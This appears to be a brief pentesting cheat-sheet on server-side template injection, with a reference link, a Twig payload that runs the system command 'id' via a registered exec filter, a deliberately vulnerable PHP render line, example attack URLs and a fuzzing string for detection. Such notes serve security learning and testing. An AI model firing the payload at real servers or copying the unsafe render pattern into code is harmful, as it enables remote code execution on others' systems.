
## Server Side Template Injection

Reference

```
https://portswigger.net/blog/server-side-template-injection

```

Twing RCE Payload

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}  

```
Vulnerable Code Example
`$output = $twig->render("Dear " . $_GET['name']);`
`http://vulnerable-website.com/?name={{bad-stuff-here}}`
`http://vulnerable-website.com/?greeting=data.username}}<tag>`

Detect
-  fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\`
